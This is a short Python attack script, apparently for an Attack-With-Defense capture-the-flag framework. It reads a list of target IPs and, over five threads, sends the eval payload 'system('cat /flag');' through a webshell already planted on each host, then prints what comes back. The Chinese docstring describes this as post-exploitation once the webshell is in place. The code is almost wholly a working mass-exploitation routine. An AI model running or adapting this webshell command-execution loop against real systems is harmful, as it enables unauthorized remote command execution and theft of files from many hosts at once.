from awdframework.awd import AwdAttack,AwdTask
from ..models import Example
from os.path import dirname
class Exp(AwdTask):
    """
    自定义一个Exp类，继承自AwdTask。覆写 attack_use_webshell()，主要于webshell种下之后的后渗透
    """
    def __init__(self, ips, port=80):
        super().__init__(ips, port)

    def attack_use_webshell(self,ip):
        resp = Example.test_available_and_eval(ip,"system('cat /flag');")
        print(resp.text)

ips = []
with open(f"{dirname(__file__)}/../../ip.txt") as f:
    ips = f.read().split("\n")
attacker = AwdAttack(ips=ips,task_class=Exp,port=80,thread_num=5)
attacker.attack()